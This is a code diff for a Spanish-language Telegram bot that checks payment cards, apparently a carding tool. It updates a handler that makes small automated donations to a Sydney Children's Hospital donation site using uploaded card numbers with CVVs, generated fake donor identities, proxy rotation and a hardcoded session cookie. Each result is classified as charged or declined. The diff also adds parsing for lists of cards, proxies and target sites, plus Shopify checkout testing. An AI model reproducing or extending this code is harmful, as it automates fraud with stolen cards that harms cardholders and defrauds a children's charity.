@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 """
-Bot de Telegram para verificar tarjetas - VERSIÓN CON SHOPIFY + GIVEWP DONATIONS
-Integra el gateway de donaciones GiveWP (Sydney Children's Hospital)
+Bot de Telegram para verificar tarjetas - VERSIÓN FINAL
+Con Shopify + GiveWP, detección inteligente de archivos y logging completo
 """
 
 import os
@@ -22,6 +22,13 @@ import sys
 from telegram import Update, Document, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
 import aiohttp
+
+# ================== CONFIGURACIÓN DE LOGGING ==================
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
 
 # ================== MANEJO DE SEÑALES ==================
 def handle_shutdown(signum, frame):
@@ -62,13 +69,10 @@ class Settings:
         "bin_lookup": 2,
     }
 
-# ================== LOGGING ==================
-logging.basicConfig(
-    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
-    level=logging.INFO
-)
-logger = logging.getLogger(__name__)
+    # Cookie de sesión GiveWP
+    GIVEWP_SESSION_COOKIE = "_mwp_templates_session_id=d3006e4f268f308359cb0b1f2deeba36c19961447cfb3b686d075f145bbe963b; __cf_bm=ql.06QngxLGWXpotjCgJ55McvKs7UURClo4CG8QmquY-1771952389-1.0.1.1-JXnh6OmstNvxZrNfJQCHYLUi0sWvh.2Pz7odsE17s7tuePaJzGI408PfBdPkVbVKMnslXizQGYgHqtMy3hiLsr41cX2o2_iuOQQhMtKHFv8; cookieyes-consent=consentid:VUZuS2R1MnNXUktFdW1DQ0dCeEt0TjRBa1JKbEpJelg,consent:,action:,necessary:,functional:,analytics:,performance:,advertisement:,other:"
 
+# ================== INSTANCE ID ==================
 INSTANCE_ID = os.environ.get("RAILWAY_DEPLOYMENT_ID", str(time.time()))
 
 # ================== ENUMS ==================
@@ -253,6 +257,88 @@ def create_progress_bar(current: int, total: int, width: int = 20) -> str:
     bar = "█" * filled + "░" * (width - filled)
     return f"[{bar}]"
 
+def escape_markdown(text: str) -> str:
+    """Escapa caracteres especiales para Markdown de Telegram"""
+    special_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
+    for char in special_chars:
+        text = text.replace(char, f'\\{char}')
+    return text
+
+# ================== DETECCIÓN INTELIGENTE DE LÍNEAS ==================
+def detect_line_type(line: str) -> Tuple[str, Optional[str]]:
+    """
+    Detecta si una línea es SITE, PROXY o CARD
+    Retorna: (tipo, línea_normalizada)
+    """
+    line = line.strip()
+    if not line:
+        return None, None
+
+    # 1️⃣ DETECCIÓN DE SITES (URLs)
+    if line.startswith(('http://', 'https://')):
+        # Es una URL completa
+        rest = line.split('://')[1]
+        if '.' in rest and not rest.startswith('.') and ' ' not in rest:
+            return 'site', line
+    
+    # También puede ser dominio sin protocolo
+    if not line.startswith(('http://', 'https://')):
+        # Patrón de dominio válido
+        domain_pattern = r'^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}(:\d+)?$'
+        if re.match(domain_pattern, line):
+            return 'site', f"https://{line}"
+
+    # 2️⃣ DETECCIÓN DE PROXIES
+    if not line.startswith(('http://', 'https://')):
+        parts = line.split(':')
+        
+        # Formato ip:port (2 partes)
+        if len(parts) == 2:
+            host, port = parts
+            if port.isdigit() and 1 <= int(port) <= 65535:
+                if re.match(r'^[a-zA-Z0-9\.\-_]+$', host):
+                    return 'proxy', line
+        
+        # Formato ip:port:user:pass (4 partes)
+        elif len(parts) == 4:
+            host, port, user, password = parts
+            if port.isdigit() and 1 <= int(port) <= 65535:
+                if re.match(r'^[a-zA-Z0-9\.\-_]+$', host):
+                    return 'proxy', line
+        
+        # Formato ip:port: (3 partes, último vacío)
+        elif len(parts) == 3 and parts[2] == '':
+            host, port, _ = parts
+            if port.isdigit() and 1 <= int(port) <= 65535:
+                if re.match(r'^[a-zA-Z0-9\.\-_]+$', host):
+                    return 'proxy', f"{host}:{port}::"
+
+    # 3️⃣ DETECCIÓN DE TARJETAS
+    if '|' in line:
+        parts = line.split('|')
+        if len(parts) == 4:
+            numero, mes, año, cvv = parts
+            # Validación básica
+            if (numero.isdigit() and len(numero) >= 13 and len(numero) <= 19 and
+                mes.isdigit() and 1 <= int(mes) <= 12 and
+                año.isdigit() and len(año) in (2, 4) and
+                cvv.isdigit() and len(cvv) in (3, 4)):
+                return 'card', line
+
+    # 4️⃣ DETECCIÓN DE TARJETAS CON ESPACIOS
+    if ' ' in line and '|' not in line:
+        # Posible formato con espacios: 4377 1100 1030 9114|08|2026|501
+        parts = line.replace(' ', '').split('|')
+        if len(parts) == 4:
+            numero, mes, año, cvv = parts
+            if (numero.isdigit() and len(numero) >= 13 and len(numero) <= 19 and
+                mes.isdigit() and 1 <= int(mes) <= 12 and
+                año.isdigit() and len(año) in (2, 4) and
+                cvv.isdigit() and len(cvv) in (3, 4)):
+                return 'card', f"{numero}|{mes}|{año}|{cvv}"
+
+    return None, None
+
 # ================== CACHÉ DE BIN ==================
 BIN_CACHE = {}
 BIN_CACHE_LOCK = asyncio.Lock()
@@ -263,7 +349,7 @@ async def get_bin_session() -> aiohttp.ClientSession:
     global BIN_SESSION
     async with BIN_SESSION_LOCK:
         if BIN_SESSION is None or BIN_SESSION.closed:
-            timeout = aiohttp.ClientTimeout(total=2)
+            timeout = aiohttp.ClientTimeout(total=Settings.TIMEOUT_CONFIG["bin_lookup"])
             BIN_SESSION = aiohttp.ClientSession(timeout=timeout)
         return BIN_SESSION
 
@@ -279,7 +365,7 @@ async def get_bin_info(bin_code: str) -> Dict:
         async with session.get(f"https://lookup.binlist.net/{bin_code}") as resp:
             if resp.status == 200:
                 try:
-                    data = await asyncio.wait_for(resp.json(), timeout=2)
+                    data = await asyncio.wait_for(resp.json(), timeout=Settings.TIMEOUT_CONFIG["bin_lookup"])
                     result = {
                         "bank": data.get("bank", {}).get("name", "Unknown"),
                         "brand": data.get("scheme", "Unknown").upper(),
@@ -357,45 +443,6 @@ class CardValidator:
             "bin": number[:6],
             "last4": number[-4:]
         }
-
-# ================== DETECCIÓN INTELIGENTE ==================
-def detect_line_type(line: str) -> Tuple[str, Optional[str]]:
-    line = line.strip()
-    if not line:
-        return None, None
-
-    if line.startswith(('http://', 'https://')):
-        rest = line.split('://')[1]
-        if '.' in rest and not rest.startswith('.') and ' ' not in rest:
-            return 'site', line
-
-    if not line.startswith(('http://', 'https://')):
-        parts = line.split(':')
-        
-        if len(parts) == 2:
-            host, port = parts
-            if port.isdigit() and 1 <= int(port) <= 65535:
-                if re.match(r'^[a-zA-Z0-9\.\-_]+$', host):
-                    return 'proxy', line
-        
-        elif len(parts) == 4:
-            host, port, user, password = parts
-            if port.isdigit() and 1 <= int(port) <= 65535:
-                if re.match(r'^[a-zA-Z0-9\.\-_]+$', host):
-                    return 'proxy', line
-
-    if '|' in line:
-        parts = line.split('|')
-        if len(parts) == 4:
-            numero, mes, año, cvv = parts
-            if (numero.isdigit() and len(numero) >= 13 and len(numero) <= 19 and
-                mes.isdigit() and 1 <= int(mes) <= 12 and
-                año.isdigit() and len(año) in (2, 4) and
-                cvv.isdigit() and len(cvv) in (3, 4)):
-                if CardValidator.luhn_check(numero):
-                    return 'card', line
-
-    return None, None
 
 # ================== BASE DE DATOS ==================
 class Database:
@@ -556,6 +603,46 @@ class Database:
             cursor.execute(query, params)
             return [dict(row) for row in cursor.fetchall()]
 
+    async def get_stats(self, user_id: int) -> Dict:
+        """Obtiene estadísticas del usuario"""
+        with sqlite3.connect(self.db_path) as conn:
+            cursor = conn.cursor()
+            
+            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ?", (user_id,))
+            total = cursor.fetchone()[0]
+            
+            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status = 'charged'", (user_id,))
+            charged = cursor.fetchone()[0]
+            
+            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status = 'declined'", (user_id,))
+            declined = cursor.fetchone()[0]
+            
+            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status = 'declined_likely'", (user_id,))
+            declined_likely = cursor.fetchone()[0]
+            
+            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status LIKE '%timeout%'", (user_id,))
+            timeout = cursor.fetchone()[0]
+            
+            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status = 'captcha_required'", (user_id,))
+            captcha = cursor.fetchone()[0]
+            
+            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status = '3ds_required'", (user_id,))
+            three_ds = cursor.fetchone()[0]
+            
+            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status = 'unknown'", (user_id,))
+            unknown = cursor.fetchone()[0]
+            
+            return {
+                "total": total,
+                "charged": charged,
+                "declined": declined,
+                "declined_likely": declined_likely,
+                "timeout": timeout,
+                "captcha": captcha,
+                "three_ds": three_ds,
+                "unknown": unknown
+            }
+
     async def cleanup_old_results(self, days: int = 7):
         await self.execute(
             "DELETE FROM results WHERE created_at < date('now', ?)",
@@ -573,15 +660,16 @@ class Database:
         if BIN_SESSION and not BIN_SESSION.closed:
             await BIN_SESSION.close()
 
-# ================== NUEVO: GIVEWP DONATION HANDLER ==================
+# ================== GIVEWP DONATION HANDLER ==================
 class GiveWPDonationHandler:
-    """Maneja donaciones en sitios GiveWP (Sydney Children's Hospital)"""
+    """Maneja donaciones en sitios GiveWP con logging detallado"""
     
     def __init__(self, session_cookies: str = None):
         self.session = None
         self.cookies = self._parse_cookies(session_cookies) if session_cookies else {}
         self.base_url = "https://donate.schf.org.au"
         self.personal_data = {}
+        logger.info(f"🆕 Inicializando GiveWPDonationHandler - Cookies: {bool(self.cookies)}")
         
     def _parse_cookies(self, cookie_string: str) -> Dict:
         """Convierte string de cookies a diccionario"""
@@ -590,12 +678,14 @@ class GiveWPDonationHandler:
             if '=' in cookie:
                 key, value = cookie.split('=', 1)
                 cookies[key] = value
+        logger.info(f"🍪 Cookies parseadas: {list(cookies.keys())}")
         return cookies
     
     async def get_session(self) -> aiohttp.ClientSession:
         """Obtiene sesión con cookies persistentes"""
         if self.session is None or self.session.closed:
             timeout = aiohttp.ClientTimeout(total=60)
+            logger.info("🔌 Creando nueva sesión HTTP")
             self.session = aiohttp.ClientSession(
                 timeout=timeout,
                 cookies=self.cookies
@@ -617,7 +707,7 @@ class GiveWPDonationHandler:
         
         addr = random.choice(addresses)
         
-        return {
+        data = {
             "first_name": random.choice(first_names),
             "last_name": random.choice(last_names),
             "email": f"{random.choice(first_names).lower()}.{random.choice(last_names).lower()}{random.randint(1,999)}@gmail.com",
@@ -628,28 +718,39 @@ class GiveWPDonationHandler:
             "state": "Western Australia",
             "country": "Australia"
         }
+        
+        logger.info(f"👤 Datos personales generados: {data['first_name']} {data['last_name']}, {data['email']}")
+        return data
     
     async def complete_donation(self, amount: float, card_data: Dict) -> JobResult:
-        """Ejecuta el flujo completo de donación"""
+        """Ejecuta el flujo completo de donación con logging"""
+        logger.info(f"🎯 Iniciando flujo de donación: ${amount}")
         session = await self.get_session()
         start_time = time.time()
         
         try:
             # Paso 1: Visitar página principal (obtener cookies)
+            logger.info("📡 Paso 1: Visitando página principal")
             async with session.get(self.base_url) as resp:
                 html = await resp.text()
+                logger.info(f"✅ Página principal cargada - Status: {resp.status}, Tamaño: {len(html)} bytes")
+            
+            await asyncio.sleep(1)
             
             # Paso 2: Establecer cantidad
+            logger.info(f"💰 Paso 2: Estableciendo cantidad ${amount}")
             amount_data = {
                 "give-form-id": "1",
                 "give-amount": f"{amount:.2f}",
             }
             async with session.post(f"{self.base_url}/", data=amount_data) as resp:
-                await resp.text()
+                html2 = await resp.text()
+                logger.info(f"✅ Cantidad establecida - Status: {resp.status}")
             
             await asyncio.sleep(1)
             
             # Paso 3: Generar y enviar datos personales
+            logger.info("📝 Paso 3: Enviando datos personales")
             personal = self.generate_fake_personal_data()
             self.personal_data = personal
             
@@ -660,11 +761,13 @@ class GiveWPDonationHandler:
                 "give_phone": personal["phone"],
             }
             async with session.post(f"{self.base_url}/", data=personal_data) as resp:
-                await resp.text()
+                html3 = await resp.text()
+                logger.info(f"✅ Datos personales enviados - Status: {resp.status}")
             
             await asyncio.sleep(1)
             
             # Paso 4: Enviar dirección
+            logger.info("🏠 Paso 4: Enviando dirección")
             address_data = {
                 "billing_address1": personal["address"],
                 "billing_address2": "",
@@ -674,15 +777,25 @@ class GiveWPDonationHandler:
                 "billing_country": personal["country"],
             }
             async with session.post(f"{self.base_url}/", data=address_data) as resp:
-                await resp.text()
+                html4 = await resp.text()
+                logger.info(f"✅ Dirección enviada - Status: {resp.status}")
             
             await asyncio.sleep(1)
             
             # Paso 5: Ir a página de pago
+            logger.info("💳 Paso 5: Accediendo a página de pago")
             async with session.get(f"{self.base_url}/payment") as resp:
                 payment_html = await resp.text()
+                logger.info(f"✅ Página de pago cargada - Status: {resp.status}, Tamaño: {len(payment_html)} bytes")
+                
+                # Buscar indicadores de Stripe
+                if "stripe" in payment_html.lower():
+                    logger.info("💳 Stripe detectado en la página")
+                if "card" in payment_html.lower():
+                    logger.info("💳 Formulario de tarjeta detectado")
             
             # Paso 6: Enviar datos de tarjeta
+            logger.info("💳 Paso 6: Enviando datos de tarjeta")
             cardholder = f"{personal['first_name']} {personal['last_name']}"
             payment_data = {
                 "cardholder_name": cardholder,
@@ -691,15 +804,22 @@ class GiveWPDonationHandler:
                 "card_cvc": card_data['cvv'],
             }
             
+            logger.debug(f"Datos de pago: {cardholder}, tarjeta: {card_data['number'][:6]}xxxxxx{card_data['number'][-4:]}")
+            
             async with session.post(f"{self.base_url}/payment", data=payment_data, allow_redirects=True) as pay_resp:
                 elapsed = time.time() - start_time
                 final_text = await pay_resp.text()
+                
+                logger.info(f"✅ Pago procesado - Status: {pay_resp.status}, Tiempo: {elapsed:.2f}s")
+                logger.info(f"📄 Respuesta (primeros 200 chars): {final_text[:200]}")
                 
                 # Clasificar resultado
                 status, confidence, reason, patterns = ResponseClassifier.classify(final_text, pay_resp.status, elapsed)
                 
                 # Extraer precio
                 price = f"${amount:.2f}"
+                
+                logger.info(f"📊 Resultado clasificado: {status.value} - {reason}")
                 
                 return JobResult(
                     job=Job(
@@ -720,8 +840,30 @@ class GiveWPDonationHandler:
                     patterns_detected=patterns
                 )
                 
+        except asyncio.TimeoutError:
+            elapsed = time.time() - start_time
+            logger.error(f"⏱️ TIMEOUT después de {elapsed:.2f}s")
+            return JobResult(
+                job=Job(
+                    site=self.base_url,
+                    proxy="",
+                    card_data=card_data,
+                    job_id=0
+                ),
+                status=CheckStatus.READ_TIMEOUT,
+                confidence=Confidence.MEDIUM,
+                reason="donation_timeout",
+                response_time=elapsed,
+                http_code=None,
+                response_text="",
+                success=False,
+                bin_info=await get_bin_info(card_data['bin']),
+                price=f"${amount:.2f}"
+            )
+            
         except Exception as e:
             elapsed = time.time() - start_time
+            logger.error(f"💥 Error en donación: {str(e)}", exc_info=True)
             return JobResult(
                 job=Job(
                     site=self.base_url,
@@ -771,6 +913,8 @@ class ProxyHealthChecker:
             proxy_parts = proxy.split(':')
             if len(proxy_parts) == 4:
                 proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
+            elif len(proxy_parts) == 3 and proxy_parts[2] == '':
+                proxy_url = f"http://{proxy_parts[0]}:{proxy_parts[1]}"
             else:
                 proxy_url = f"http://{proxy_parts[0]}:{proxy_parts[1]}"
             
@@ -833,6 +977,8 @@ class ShopifyJobExecutor:
             proxy_parts = job.proxy.split(':')
             if len(proxy_parts) == 4:
                 proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
+            elif len(proxy_parts) == 3 and proxy_parts[2] == '':
+                proxy_url = f"http://{proxy_parts[0]}:{proxy_parts[1]}"
             elif len(proxy_parts) == 2:
                 proxy_url = f"http://{job.proxy}"
             else:
@@ -1051,11 +1197,62 @@ class CardCheckService:
         return result
 
     async def donate_givewp(self, user_id: int, card_data: Dict, amount: float = 5.00, session_cookie: str = None) -> JobResult:
+        """Verifica una donación en GiveWP con logging detallado"""
+        logger.info(f"🚀 Iniciando donación GiveWP para tarjeta {card_data['bin']}xxxxxx{card_data['last4']}, monto ${amount}")
+        start_time = time.time()
+        
         handler = GiveWPDonationHandler(session_cookie)
         try:
+            logger.info("⏳ Ejecutando complete_donation...")
             result = await handler.complete_donation(amount, card_data)
+            
+            elapsed = time.time() - start_time
+            logger.info(f"✅ Donación completada en {elapsed:.2f}s - Status: {result.status.value}")
+            
             await self.db.save_result(user_id, result, "givewp")
             return result
+            
+        except asyncio.TimeoutError:
+            elapsed = time.time() - start_time
+            logger.error(f"⏱️ TIMEOUT en donación después de {elapsed:.2f}s")
+            return JobResult(
+                job=Job(
+                    site=handler.base_url,
+                    proxy="",
+                    card_data=card_data,
+                    job_id=0
+                ),
+                status=CheckStatus.READ_TIMEOUT,
+                confidence=Confidence.MEDIUM,
+                reason="donation_timeout",
+                response_time=elapsed,
+                http_code=None,
+                response_text="",
+                success=False,
+                bin_info=await get_bin_info(card_data['bin']),
+                price=f"${amount:.2f}"
+            )
+            
+        except Exception as e:
+            elapsed = time.time() - start_time
+            logger.error(f"💥 Error en donación: {str(e)}", exc_info=True)
+            return JobResult(
+                job=Job(
+                    site=handler.base_url,
+                    proxy="",
+                    card_data=card_data,
+                    job_id=0
+                ),
+                status=CheckStatus.UNKNOWN,
+                confidence=Confidence.LOW,
+                reason=f"error: {str(e)[:50]}",
+                response_time=elapsed,
+                http_code=None,
+                response_text="",
+                success=False,
+                bin_info=await get_bin_info(card_data['bin']),
+                price=f"${amount:.2f}"
+            )
         finally:
             await handler.close()
 
@@ -1066,93 +1263,6 @@ card_service = None
 cancel_mass = {}
 user_state = {}
 active_mass = set()
-
-# ================== COOKIE DE SESIÓN GIVEWP ==================
-# La cookie que obtuviste de tu prueba
-GIVEWP_SESSION_COOKIE = "_mwp_templates_session_id=d3006e4f268f308359cb0b1f2deeba36c19961447cfb3b686d075f145bbe963b; __cf_bm=ql.06QngxLGWXpotjCgJ55McvKs7UURClo4CG8QmquY-1771952389-1.0.1.1-JXnh6OmstNvxZrNfJQCHYLUi0sWvh.2Pz7odsE17s7tuePaJzGI408PfBdPkVbVKMnslXizQGYgHqtMy3hiLsr41cX2o2_iuOQQhMtKHFv8; cookieyes-consent=consentid:VUZuS2R1MnNXUktFdW1DQ0dCeEt0TjRBa1JKbEpJelg,consent:,action:,necessary:,functional:,analytics:,performance:,advertisement:,other:"
-
-# ================== COMANDOS GIVEWP ==================
-
-async def donate(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Donación GiveWP con tarjeta"""
-    user_id = update.effective_user.id
-    
-    # Obtener tarjeta
-    user_data = await user_manager.get_user_data(user_id)
-    cards = user_data.get("cards", [])
-    
-    if not cards:
-        await update.message.reply_text("❌ Primero sube tarjetas con /upload")
-        return
-    
-    # Determinar cantidad (por defecto $5)
-    amount = 5.00
-    card_index = 0
-    
-    if context.args:
-        try:
-            amount = float(context.args[0].replace('$', ''))
-        except:
-            pass
-    
-    if len(context.args) > 1:
-        try:
-            card_index = int(context.args[1]) - 1
-        except:
-            pass
-    
-    if card_index < 0 or card_index >= len(cards):
-        await update.message.reply_text("❌ Número de tarjeta inválido")
-        return
-    
-    card_str = cards[card_index]
-    card_data = CardValidator.parse_card(card_str)
-    
-    if not card_data:
-        await update.message.reply_text("❌ Tarjeta inválida")
-        return
-    
-    msg = await update.message.reply_text(
-        f"🔄 Procesando donación de ${amount:.2f} en Sydney Children's Hospital...\n"
-        f"💳 Tarjeta #{card_index+1}: {card_data['bin']}xxxxxx{card_data['last4']}"
-    )
-    
-    result = await card_service.donate_givewp(user_id, card_data, amount, GIVEWP_SESSION_COOKIE)
-    
-    emoji = get_status_emoji(result.status)
-    confidence_icon = get_confidence_icon(result.confidence)
-    
-    response = (
-        f"{emoji} *DONACIÓN COMPLETADA*\n"
-        f"━━━━━━━━━━━━━━━━━━\n\n"
-        f"🏥 Hospital: Sydney Children's Hospital\n"
-        f"💰 Monto: ${amount:.2f}\n"
-        f"📊 Estado: {result.status.value.upper()}\n"
-        f"{confidence_icon} Confianza: {result.confidence.value}\n"
-        f"📝 Razón: {result.reason}\n"
-        f"⏱️ Tiempo: {result.response_time:.1f}s\n\n"
-        f"💳 Tarjeta: {card_data['bin']}xxxxxx{card_data['last4']}\n"
-    )
-    
-    if result.price != "N/A":
-        response += f"💰 Precio detectado: {result.price}\n"
-    
-    await msg.edit_text(response, parse_mode="Markdown")
-
-async def donate5(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Atajo para donación de $5"""
-    context.args = ["5"]
-    await donate(update, context)
-
-async def donate10(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Atajo para donación de $10"""
-    context.args = ["10"]
-    await donate(update, context)
-
-async def donate20(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Atajo para donación de $20"""
-    context.args = ["20"]
-    await donate(update, context)
 
 # ================== MENÚ PRINCIPAL ==================
 async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, edit: bool = False):
@@ -1358,6 +1468,124 @@ async def show_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
         text, parse_mode="Markdown", reply_markup=reply_markup
     )
 
+# ================== FUNCIÓN DONATE CORREGIDA ==================
+async def donate(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Donación GiveWP con tarjeta (maneja mensajes y callbacks)"""
+    user_id = update.effective_user.id
+    
+    # Determinar si es callback o mensaje directo
+    is_callback = update.callback_query is not None
+    message = update.message if not is_callback else update.callback_query.message
+    
+    # Obtener tarjeta
+    user_data = await user_manager.get_user_data(user_id)
+    cards = user_data.get("cards", [])
+    
+    if not cards:
+        text = "❌ Primero sube tarjetas con /upload"
+        if is_callback:
+            await update.callback_query.edit_message_text(text)
+        else:
+            await update.message.reply_text(text)
+        return
+    
+    # Determinar cantidad (por defecto $5)
+    amount = 5.00
+    card_index = 0
+    
+    if context.args:
+        try:
+            amount = float(context.args[0].replace('$', ''))
+        except:
+            pass
+    
+    if len(context.args) > 1:
+        try:
+            card_index = int(context.args[1]) - 1
+        except:
+            pass
+    
+    if card_index < 0 or card_index >= len(cards):
+        text = "❌ Número de tarjeta inválido"
+        if is_callback:
+            await update.callback_query.edit_message_text(text)
+        else:
+            await update.message.reply_text(text)
+        return
+    
+    card_str = cards[card_index]
+    card_data = CardValidator.parse_card(card_str)
+    
+    if not card_data:
+        text = "❌ Tarjeta inválida"
+        if is_callback:
+            await update.callback_query.edit_message_text(text)
+        else:
+            await update.message.reply_text(text)
+        return
+    
+    # Mensaje de progreso
+    progress_text = (
+        f"🔄 Procesando donación de ${amount:.2f} en Sydney Children's Hospital...\n"
+        f"💳 Tarjeta #{card_index+1}: {card_data['bin']}xxxxxx{card_data['last4']}"
+    )
+    
+    if is_callback:
+        await update.callback_query.edit_message_text(progress_text)
+        msg = update.callback_query.message
+    else:
+        msg = await update.message.reply_text(progress_text)
+    
+    # Realizar donación
+    result = await card_service.donate_givewp(user_id, card_data, amount, Settings.GIVEWP_SESSION_COOKIE)
+    
+    emoji = get_status_emoji(result.status)
+    confidence_icon = get_confidence_icon(result.confidence)
+    
+    # Escapar caracteres especiales para Markdown
+    reason_escaped = escape_markdown(result.reason)
+    status_escaped = escape_markdown(result.status.value.upper())
+    confidence_escaped = escape_markdown(result.confidence.value)
+    
+    response = (
+        f"{emoji} *DONACIÓN COMPLETADA*\n"
+        f"━━━━━━━━━━━━━━━━━━\n\n"
+        f"🏥 Hospital: Sydney Children's Hospital\n"
+        f"💰 Monto: ${amount:.2f}\n"
+        f"📊 Estado: {status_escaped}\n"
+        f"{confidence_icon} Confianza: {confidence_escaped}\n"
+        f"📝 Razón: {reason_escaped}\n"
+        f"⏱️ Tiempo: {result.response_time:.1f}s\n\n"
+        f"💳 Tarjeta: {card_data['bin']}xxxxxx{card_data['last4']}"
+    )
+    
+    if result.price != "N/A":
+        price_escaped = escape_markdown(result.price)
+        response += f"\n💰 Precio detectado: {price_escaped}"
+    
+    try:
+        await msg.edit_text(response, parse_mode="Markdown")
+    except Exception as e:
+        logger.error(f"Error en Markdown: {e}")
+        # Si falla Markdown, enviar sin formato
+        await msg.edit_text(response.replace('*', '').replace('_', ''))
+
+# ================== FUNCIONES ATAJO DONATE ==================
+async def donate5(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Atajo para donación de $5"""
+    context.args = ["5"]
+    await donate(update, context)
+
+async def donate10(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Atajo para donación de $10"""
+    context.args = ["10"]
+    await donate(update, context)
+
+async def donate20(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Atajo para donación de $20"""
+    context.args = ["20"]
+    await donate(update, context)
+
 # ================== MANEJO DE BOTONES ==================
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -1432,20 +1660,29 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         emoji = get_status_emoji(result.status)
         confidence_icon = get_confidence_icon(result.confidence)
         
+        reason_escaped = escape_markdown(result.reason)
+        status_escaped = escape_markdown(result.status.value.upper())
+        confidence_escaped = escape_markdown(result.confidence.value)
+        
         response = (
             f"{emoji} *RESULTADO SHOPIFY*\n"
             f"━━━━━━━━━━━━━━━━━━\n\n"
             f"💳 Tarjeta: `{card_data['bin']}xxxxxx{card_data['last4']}`\n"
-            f"📊 Estado: {result.status.value.upper()}\n"
-            f"{confidence_icon} Confianza: {result.confidence.value}\n"
-            f"📝 Razón: {result.reason}\n"
+            f"📊 Estado: {status_escaped}\n"
+            f"{confidence_icon} Confianza: {confidence_escaped}\n"
+            f"📝 Razón: {reason_escaped}\n"
             f"⏱️ Tiempo: {result.response_time:.1f}s\n"
         )
         
         if result.price != "N/A":
-            response += f"💰 Precio: {result.price}\n"
+            price_escaped = escape_markdown(result.price)
+            response += f"💰 Precio: {price_escaped}\n"
         
-        await msg.edit_text(response, parse_mode="Markdown")
+        try:
+            await msg.edit_text(response, parse_mode="Markdown")
+        except Exception as e:
+            logger.error(f"Error en Markdown: {e}")
+            await msg.edit_text(response.replace('*', '').replace('_', ''))
     else:
         await update.message.reply_text(
             "❌ Formato inválido. Usa:\n"
@@ -1454,7 +1691,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode="Markdown"
         )
 
-# ================== MANEJO DE ARCHIVOS ==================
+# ================== MANEJO DE ARCHIVOS (DETECCIÓN INTELIGENTE) ==================
 async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     document = update.message.document
@@ -1472,31 +1709,70 @@ async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = content.decode('utf-8', errors='ignore')
     lines = text.splitlines()
     
+    sites = []
+    proxies = []
     cards = []
-    invalid = 0
+    invalid = []
+    unknown = []
     
-    for line in lines:
-        line = line.strip()
+    for raw_line in lines:
+        line = raw_line.strip()
         if not line:
             continue
         
         line_type, normalized = detect_line_type(line)
-        if line_type == 'card' and CardValidator.parse_card(normalized):
-            cards.append(normalized)
-        else:
-            invalid += 1
-    
-    if cards:
-        user_data = await user_manager.get_user_data(user_id)
-        user_data["cards"].extend(cards)
-        await user_manager.update_user_data(user_id, cards=user_data["cards"])
         
-        await update.message.reply_text(
-            f"✅ {len(cards)} tarjetas guardadas\n"
-            f"❌ {invalid} líneas inválidas"
+        if line_type == 'site':
+            sites.append(normalized)
+        elif line_type == 'proxy':
+            proxies.append(normalized)
+        elif line_type == 'card':
+            card_data = CardValidator.parse_card(normalized)
+            if card_data:
+                cards.append(normalized)
+            else:
+                invalid.append(line)
+        else:
+            unknown.append(line)
+    
+    user_data = await user_manager.get_user_data(user_id)
+    updated = False
+    
+    if sites:
+        user_data["sites"].extend(sites)
+        updated = True
+    if proxies:
+        user_data["proxies"].extend(proxies)
+        updated = True
+    if cards:
+        user_data["cards"].extend(cards)
+        updated = True
+    
+    if updated:
+        await user_manager.update_user_data(
+            user_id, 
+            sites=user_data["sites"],
+            proxies=user_data["proxies"],
+            cards=user_data["cards"]
         )
+    
+    # Preparar mensaje de resumen
+    parts = []
+    if sites:
+        parts.append(f"✅ {len(sites)} sitio(s) añadido(s)")
+    if proxies:
+        parts.append(f"✅ {len(proxies)} proxy(s) añadido(s)")
+    if cards:
+        parts.append(f"✅ {len(cards)} tarjeta(s) válida(s) añadida(s)")
+    if invalid:
+        parts.append(f"⚠️ {len(invalid)} tarjeta(s) inválida(s) rechazada(s)")
+    if unknown:
+        parts.append(f"⚠️ {len(unknown)} línea(s) no reconocida(s)")
+    
+    if parts:
+        await update.message.reply_text("\n".join(parts))
     else:
-        await update.message.reply_text("❌ No se encontraron tarjetas válidas")
+        await update.message.reply_text("❌ No se encontraron datos válidos en el archivo")
 
 # ================== COMANDO START ==================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1515,6 +1791,33 @@ async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("⏹ Deteniendo mass check...")
     else:
         await update.message.reply_text("No hay mass check activo.")
+
+# ================== COMANDO PARA AGREGAR PROXY ==================
+async def add_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Agrega un proxy manualmente"""
+    user_id = update.effective_user.id
+    
+    if not context.args:
+        await update.message.reply_text(
